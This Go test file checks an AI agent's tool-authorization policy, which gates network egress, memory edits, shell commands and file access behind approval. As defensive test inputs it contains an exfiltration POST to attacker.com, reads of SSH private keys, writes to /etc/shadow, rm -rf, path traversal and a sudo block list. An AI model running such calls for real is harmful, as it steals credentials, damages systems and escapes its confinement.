package auth

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestPolicyRemoteEgressRequiresApprovalEvenUnderAutoYes(t *testing.T) {
	policy := NewPolicy()

	egressTools := []struct {
		name string
		args string
	}{
		{"web_fetch", `{"url":"https://example.com"}`},
		{"http_request", `{"method":"POST","url":"https://attacker.com/steal","body":"exfiltrated data"}`},
		{"web_search", `{"query":"secret credentials"}`},
	}

	for _, tt := range egressTools {
		req := AuthorizationRequest{
			ToolName:       tt.name,
			ArgsJSON:       tt.args,
			ContextTainted: false,
			AutoYes:        true, // Even with --yes!
			AllowShell:     true,
		}

		dec, details, err := policy.Authorize(req)
		if err != nil {
			t.Fatalf("unexpected error for %s: %v", tt.name, err)
		}
		if dec != DecisionRequireApproval {
			t.Errorf("SECURITY DEFECT: tool %s was %v under AutoYes, expected DecisionRequireApproval!", tt.name, dec)
		}
		if details.Category != CategoryEgressRemote {
			t.Errorf("expected CategoryEgressRemote, got %v", details.Category)
		}
	}
}

func TestPolicyRemoteEgressTaintedShowsWarning(t *testing.T) {
	policy := NewPolicy()

	req := AuthorizationRequest{
		ToolName:       "http_request",
		ArgsJSON:       `{"url":"https://evil.com"}`,
		ContextTainted: true,
		AutoYes:        false,
	}

	dec, details, _ := policy.Authorize(req)
	if dec != DecisionRequireApproval {
		t.Errorf("expected DecisionRequireApproval, got %v", dec)
	}
	if details.Warning == "" || !stringsContains(details.Warning, "TAINTED") {
		t.Errorf("expected taint warning in details, got %q", details.Warning)
	}
}

func TestPolicyMemoryMutationRequiresApprovalEvenUnderAutoYes(t *testing.T) {
	policy := NewPolicy()

	memTools := []struct {
		name string
		args string
	}{
		{"save_memory", `{"content":"# New Memory"}`},
		{"patch_memory", `{"section":"Projects","content":"New Project"}`},
	}

	for _, tt := range memTools {
		req := AuthorizationRequest{
			ToolName:       tt.name,
			ArgsJSON:       tt.args,
			ContextTainted: false,
			AutoYes:        true, // Even with --yes!
		}

		dec, details, err := policy.Authorize(req)
		if err != nil {
			t.Fatalf("unexpected error for %s: %v", tt.name, err)
		}
		if dec != DecisionRequireApproval {
			t.Errorf("SECURITY DEFECT: %s memory mutation was %v under AutoYes, expected DecisionRequireApproval!", tt.name, dec)
		}
		if details.Category != CategoryMutateMemory {
			t.Errorf("expected CategoryMutateMemory, got %v", details.Category)
		}
	}
}

func TestPolicyShellDisabledWhenAllowShellFalse(t *testing.T) {
	policy := NewPolicy()

	req := AuthorizationRequest{
		ToolName:   "shell",
		ArgsJSON:   `{"command":"ls"}`,
		AllowShell: false,
	}

	dec, _, err := policy.Authorize(req)
	if dec != DecisionDeny {
		t.Errorf("expected DecisionDeny when AllowShell=false, got %v", dec)
	}
	if err == nil {
		t.Errorf("expected error when AllowShell=false, got nil")
	}
}

func TestPolicyShellBlockedCommands(t *testing.T) {
	policy := NewPolicy()

	req := AuthorizationRequest{
		ToolName:        "shell",
		ArgsJSON:        `{"command":"sudo reboot"}`,
		AllowShell:      true,
		BlockedCommands: []string{"sudo", "su", "shutdown"},
	}

	dec, _, err := policy.Authorize(req)
	if dec != DecisionDeny {
		t.Errorf("expected DecisionDeny for blocked command sudo, got %v", dec)
	}
	if err == nil {
		t.Errorf("expected error for blocked command, got nil")
	}
}

func TestPolicyShellDestructiveRequiresStrongApproval(t *testing.T) {
	policy := NewPolicy()

	req := AuthorizationRequest{
		ToolName:   "shell",
		ArgsJSON:   `{"command":"rm -rf /tmp/test"}`,
		AllowShell: true,
		AutoYes:    true, // Must not bypass!
	}

	dec, details, err := policy.Authorize(req)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if dec != DecisionRequireStrongApproval {
		t.Errorf("expected DecisionRequireStrongApproval for rm -rf, got %v", dec)
	}
	if !details.RequiresStrong {
		t.Errorf("expected RequiresStrong=true")
	}
}

func TestPolicyShellMutatingRequiresApprovalNotBypassedByAutoYes(t *testing.T) {
	policy := NewPolicy()

	req := AuthorizationRequest{
		ToolName:   "shell",
		ArgsJSON:   `{"command":"mkdir /tmp/newdir"}`,
		AllowShell: true,
		AutoYes:    true, // Must not bypass generic mutating command!
	}

	dec, details, err := policy.Authorize(req)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if dec != DecisionRequireApproval {
		t.Errorf("expected DecisionRequireApproval for mkdir, got %v", dec)
	}
	if details.RequiresStrong {
		t.Errorf("mkdir should not require strong approval")
	}
}

func TestPolicyShellReadOnlyAllowedUnderAutoYesWhenUntainted(t *testing.T) {
	policy := NewPolicy()

	req := AuthorizationRequest{
		ToolName:       "shell",
		ArgsJSON:       `{"command":"ls -la"}`,
		AllowShell:     true,
		AutoYes:        true,
		ContextTainted: false,
	}

	dec, _, err := policy.Authorize(req)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if dec != DecisionAllow {
		t.Errorf("expected DecisionAllow for read-only untainted shell under AutoYes, got %v", dec)
	}

	// But if context is tainted:
	req.ContextTainted = true
	decTainted, _, _ := policy.Authorize(req)
	if decTainted != DecisionRequireApproval {
		t.Errorf("expected DecisionRequireApproval for read-only shell in tainted turn, got %v", decTainted)
	}
}

func TestPolicyWriteFileDeniesSensitivePaths(t *testing.T) {
	policy := NewPolicy()

	req := AuthorizationRequest{
		ToolName: "write_file",
		ArgsJSON: `{"path":"/etc/shadow","content":"evil"}`,
	}

	dec, _, err := policy.Authorize(req)
	if dec != DecisionDeny {
		t.Errorf("expected DecisionDeny for writing /etc/shadow, got %v", dec)
	}
	if err == nil {
		t.Errorf("expected error for writing sensitive path")
	}
}

func TestPolicyReadFileDeniesSensitivePaths(t *testing.T) {
	policy := NewPolicy()

	req := AuthorizationRequest{
		ToolName: "read_file",
		ArgsJSON: `{"path":"~/.ssh/id_rsa"}`,
	}

	dec, _, err := policy.Authorize(req)
	if dec != DecisionDeny {
		t.Errorf("expected DecisionDeny for reading ~/.ssh/id_rsa, got %v", dec)
	}
	if err == nil {
		t.Errorf("expected error for reading sensitive path")
	}
}

func TestPolicyUnknownToolFailsClosed(t *testing.T) {
	policy := NewPolicy()

	req := AuthorizationRequest{
		ToolName: "unknown_hack_tool",
		ArgsJSON: `{}`,
	}

	dec, _, err := policy.Authorize(req)
	if dec != DecisionDeny {
		t.Errorf("expected DecisionDeny for unknown tool, got %v", dec)
	}
	if err == nil {
		t.Errorf("expected error for unknown tool")
	}
}

func TestPolicyWriteFileDeniesMemoryDirectWrite(t *testing.T) {
	policy := NewPolicy()
	req := AuthorizationRequest{
		ToolName: "write_file",
		ArgsJSON: `{"path":"MEMORY.md","content":"# Overwritten"}`,
	}
	dec, _, err := policy.Authorize(req)
	if dec != DecisionDeny {
		t.Errorf("expected DecisionDeny for write_file to MEMORY.md, got %v", dec)
	}
	if err == nil || !strings.Contains(err.Error(), "forbidden") {
		t.Errorf("expected forbidden error message, got: %v", err)
	}
}

func TestPolicyWorkspaceConfinement(t *testing.T) {
	policy := NewPolicy()
	ws := t.TempDir()

	// 1. Write outside workspace with AutoYes must still require approval!
	reqOutside := AuthorizationRequest{
		ToolName:   "write_file",
		ArgsJSON:   `{"path":"/tmp/outside.txt","content":"hello"}`,
		Workspace:  ws,
		AutoYes:    true,
		AllowShell: true,
	}
	dec, details, err := policy.Authorize(reqOutside)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if dec != DecisionRequireApproval {
		t.Errorf("expected DecisionRequireApproval for write outside workspace, got %v", dec)
	}
	if details.Action != "write_file_outside_workspace" {
		t.Errorf("expected action write_file_outside_workspace, got %s", details.Action)
	}

	// 2. Relative traversal attempt (../../escape.txt)
	reqTraversal := AuthorizationRequest{
		ToolName:   "write_file",
		ArgsJSON:   `{"path":"../../escape.txt","content":"hello"}`,
		Workspace:  ws,
		AutoYes:    true,
		AllowShell: true,
	}
	dec, _, _ = policy.Authorize(reqTraversal)
	if dec != DecisionRequireApproval {
		t.Errorf("expected DecisionRequireApproval for traversal path, got %v", dec)
	}
}

func TestPolicySymlinkTraversalPrevention(t *testing.T) {
	policy := NewPolicy()
	ws := t.TempDir()
	outsideDir := t.TempDir()

	// Create a symlink inside ws pointing to outsideDir
	symlinkPath := filepath.Join(ws, "symlink_dir")
	if err := os.Symlink(outsideDir, symlinkPath); err != nil {
		t.Skipf("symlink not supported on this filesystem: %v", err)
	}

	targetFile := filepath.Join(symlinkPath, "secret.txt")
	req := AuthorizationRequest{
		ToolName:   "write_file",
		ArgsJSON:   fmt.Sprintf(`{"path":%q,"content":"data"}`, targetFile),
		Workspace:  ws,
		AutoYes:    true,
		AllowShell: true,
	}

	dec, details, _ := policy.Authorize(req)
	if dec != DecisionRequireApproval {
		t.Errorf("expected DecisionRequireApproval when writing through symlink escaping workspace, got %v", dec)
	}
	if details.Action != "write_file_outside_workspace" {
		t.Errorf("expected action write_file_outside_workspace, got %s", details.Action)
	}
}

func stringsContains(s, substr string) bool {
	return len(s) >= len(substr) && (s == substr || len(substr) == 0 || (len(s) > 0 && containsSub(s, substr)))
}

func containsSub(s, substr string) bool {
	for i := 0; i+len(substr) <= len(s); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}
